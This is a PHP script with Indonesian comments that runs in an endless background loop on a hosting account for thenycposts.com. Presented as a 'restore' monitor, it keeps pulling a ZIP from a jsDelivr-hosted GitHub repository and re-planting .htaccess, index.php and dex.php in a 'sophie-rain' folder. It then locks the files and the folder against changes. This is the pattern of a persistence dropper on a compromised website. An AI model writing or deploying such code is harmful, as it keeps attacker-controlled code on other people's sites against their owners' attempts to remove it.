<?php
set_time_limit(0);
ignore_user_abort(true);

$targetFolder = '/home/u930601804/domains/thenycposts.com/public_html/sophie-rain/';
$dexFolder = $targetFolder . '/dex-here';
$backupZipUrl = 'https://cdn.jsdelivr.net/gh/kora-kora-2/zip@main/private/thenycposts.zip';
$itemsToProtect = ['.htaccess', 'index.php', 'dex.php'];
$logFile = $targetFolder . '/home/u930601804/domains/thenycposts.com/public_html/.private/restore.log';

if(!is_dir(dirname($logFile))) mkdir(dirname($logFile), 0755, true);

function logMessage($msg) {
    global $logFile;
    $line = "[" . date('Y-m-d H:i:s') . "] " . $msg . PHP_EOL;
    file_put_contents($logFile, $line, FILE_APPEND);
}

function forceRestore($zipUrl, $targetFolder, $items) {
    $zipData = @file_get_contents($zipUrl);
    if (!$zipData) return false;

    $tmpFile = tempnam(sys_get_temp_dir(), 'restore');
    file_put_contents($tmpFile, $zipData);

    $zip = new ZipArchive;
    if ($zip->open($tmpFile) === TRUE) {
        foreach ($items as $item) {
            $filePath = $targetFolder . '/' . $item;
            
            
            if (file_exists($filePath)) {
                chmod($filePath, 0644); 
                unlink($filePath);
            }
            
            
            $zip->extractTo($targetFolder, $item);
            
            
            if (file_exists($filePath)) {
                chmod($filePath, 0444);
            }
        }
        $zip->close();
        unlink($tmpFile);
        return true;
    }
    return false;
}

logMessage("Monitoring dimulai. Izin dex-here tetap 0363.");

while (true) {
    clearstatcache();

    $needRestore = false;
    foreach ($itemsToProtect as $item) {
        $filePath = $targetFolder . '/' . $item;
        
        
        if (!file_exists($filePath)) {
            $needRestore = true;
            break;
        }
    }

    if ($needRestore) {
        logMessage("Perubahan/Penghapusan terdeteksi pada .htaccess atau file utama!");
        
        // Buka izin folder public_html agar bisa menulis file baru
        chmod($targetFolder, 0755);
        
        if (forceRestore($backupZipUrl, $targetFolder, $itemsToProtect)) {
            logMessage("Sukses mengembalikan isi file sesuai ZIP.");
        } else {
            logMessage("Gagal melakukan restore.");
        }
    }

    // KUNCI PERMISSION SESUAI PERMINTAAN
    chmod($targetFolder, 0555); // public_html jadi Read-Only
    if (is_dir($dexFolder)) {
        chmod($dexFolder, 0363); // dex-here tetap 0363
    }

    sleep(5); // Cek setiap 5 detik
}